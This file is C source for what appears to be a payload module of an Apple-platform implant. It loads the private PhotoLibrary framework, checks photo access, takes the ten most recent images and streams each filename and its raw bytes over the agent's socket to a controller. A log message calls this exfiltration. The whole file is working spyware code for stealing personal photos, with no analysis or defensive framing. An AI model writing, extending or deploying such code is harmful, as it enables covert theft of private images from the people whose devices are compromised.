#include <payload.h>

static int PHAssetMediaTypeImage = 1;
static int PHAuthorizationStatusAuthorized = 3;

bool is_authorized(agent_p agent);
void get_photos(agent_p agent);

void start(void *entry, agent_p agent)
{
    bool ret = false;
    uint64_t size = 0;
    uint64_t sent = 0;
    uint8_t *buffer = NULL;
    void *contacts = NULL;


    log_info("Loading PhotoLibrary.framework");
    if (!objcLoadBundle("/System/Library/PrivateFrameworks/PhotoLibrary.framework")) {
        log_error("Failed to load PhotoLibrary.framework");
        goto fail;
    }

    log_info("Checking photos library authorization status");
    if (is_authorized(agent) == false) {
        log_info("Not authorized to access photos, bailing..");
        goto fail;
    }

    log_info("Fetching photos");
    agent->trampoline.enable_log_null_redirection(agent);
    get_photos(agent);
    agent->trampoline.disable_log_null_redirection(agent);

    log_info("Successfully exfiltrated photos");

    size = 0;
    agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
    return;

fail:
    size = 0;
    agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
}

bool is_authorized(agent_p agent)
{
    return (
        (int)objcMsgSendCast()(
            objcGetClass(PHPhotoLibrary),
            objcGetSelector(authorizationStatus)
        ) == PHAuthorizationStatusAuthorized
    );
}

void get_photos(agent_p agent)
{
    void *fetchOpts;
    void *sortDescriptors;
    void *fetchResult;

    if ((fetchOpts = objcAllocInitClass(PHFetchOptions)) == NULL) {
        log_info("Failed to init PHFetchOptions");
        return;
    }
    sortDescriptors = objcMsgSendCast(void *)(
        objcGetClass(NSArray),
        objcGetSelector(arrayWithObject:),
        objcMsgSendCast(void *, int)(
            objcGetClass(NSSortDescriptor),
            objcGetSelector(sortDescriptorWithKey:ascending:),
            CFSTR("creationDate"),
            false
        )
    );
    objcMsgSendCast(void*)(
        fetchOpts,
        objcGetSelector(setSortDescriptors:),
        sortDescriptors
    );
    objcMsgSendCast(unsigned long)(
        fetchOpts,
        objcGetSelector(setFetchLimit:),
        10
    );

    fetchResult = objcMsgSendCast(long, void*)(
        objcGetClass(PHAsset),
        objcGetSelector(fetchAssetsWithMediaType:options:),
        PHAssetMediaTypeImage,
        fetchOpts
    );

    unsigned long count = (unsigned long)objcMsgSendCast()(
        fetchResult,
        objcGetSelector(count)
    );
    if (count > 0) {
        void* reqOpts = objcAllocInitClass(PHImageRequestOptions);
        objcMsgSendCast(int)(
            reqOpts,
            objcGetSelector(setSynchronous:),
            true
        );

        unsigned long i;
        for (i = 0; i < count; i++) {
            void* asset = objcMsgSendCast(unsigned long)(fetchResult, objcGetSelector(objectAtIndex:), i);
            if (!asset) continue;
            void* pl = objcMsgSendCast()(asset, objcGetSelector(pl_photoLibrary));
            void* pl_asset = objcMsgSendCast(void*)(asset, objcGetSelector(managedAssetForPhotoLibrary:), pl);
            if (!pl_asset) continue;
            void* uti = objcMsgSendCast()(pl_asset, objcGetSelector(uniformTypeIdentifier));
            if (!uti) continue;
            void* filename = objcMsgSendCast()(pl_asset, objcGetSelector(filename));
            if (!filename) continue;
            void* pbRep = objcMsgSendCast()(pl_asset, objcGetSelector(pasteBoardRepresentation));
            if (!pbRep) continue;
            void* imgData = objcMsgSendCast(void*)(pbRep, objcGetSelector(objectForKey:), uti);
            if (!imgData) continue;

            char* fname = (char*)objcMsgSendCast()(filename, objcGetSelector(UTF8String));
            uint64_t size = agent->trampoline.strlen(fname);
            log_info("Sending filename '%s' (%llu)", fname, size);
            agent->trampoline.send(agent->fd, &size, sizeof(size), 0);
            agent->trampoline.send(agent->fd, fname, size, 0);

            size = (unsigned long)objcMsgSendCast()(imgData, objcGetSelector(length));
            char* buffer = (char*)objcMsgSendCast()(imgData, objcGetSelector(bytes));

            log_info("Sending buffer with size: %llu", size);
            agent->trampoline.send(agent->fd, &size, sizeof(size), 0);

            uint64_t sent = 0;
            while (sent < size) {
                ssize_t c = agent->trampoline.send(agent->fd, buffer + sent, size - sent, 0);
                if (c < 0) {
                    log_error("Failed to send buffer: %s", agent->trampoline.strerror(*(agent->trampoline.errno)));
                    return;
                }
                sent += c;
            }
        }
    }
}
